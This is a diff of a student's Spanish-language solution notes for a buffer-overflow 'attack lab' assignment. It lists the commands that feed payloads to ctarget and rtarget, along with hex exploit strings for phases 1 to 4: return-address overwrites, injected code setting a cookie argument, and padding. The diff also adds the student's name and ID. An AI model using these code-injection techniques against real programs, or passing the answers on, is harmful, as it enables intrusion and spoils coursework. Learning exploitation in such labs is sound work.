@@ -1,13 +1,10 @@
-Realizado en Arch Linux.
+Juan Diego Soto Castro, C07722. Realizado en Arch Linux.
 
 Como dar las soluciones:
 cat phase1.txt | ./hex2raw | ./ctarget -q
 cat phase2.txt | ./hex2raw | ./ctarget -q
 cat phase3.txt | ./hex2raw | ./ctarget -q
 cat phase4.txt | ./hex2raw | ./rtarget -q
-cat phase5.txt | ./hex2raw | ./rtarget -q
-
-
 
 
 1.phase1
@@ -17,17 +14,14 @@ cat phase5.txt | ./hex2raw | ./rtarget -q
 00 00 00 00 00 00 00 00 
 a4 1c 40 00 00 00 00 00 -> Direccion del touch 1
 
-
-
-2.
-
+2. phase2
 48 c7 c7 f8 4f bf 5f 68 -> Cookie
 de 1c 40 00 c3 00 00 00 -> Push dir memoria touch2
 00 00 00 00 00 00 00 00 
 98 1c 68 55 00 00 00 00 -> Return address rsp 
 
 
-3.
+3.phase3
 48 c7 c7 c0 1c 68 55 c3 -> x/s $rsp + 8 + 8 + buffer
 00 00 00 00 00 00 00 00 
 00 00 00 00 00 00 00 00 -> Padding, con una linea menos
@@ -42,16 +36,7 @@ ahora rsp + 8 + 8 + buffer =
 mov $0x5681CC0, %rdi 
 ret
 
-
-
-
-
-
-
-
-
-
-4.
+4.phase4
 00 00 00 00 00 00 00 00 
 00 00 00 00 00 00 00 00 
 00 00 00 00 00 00 00 00 -> buffer
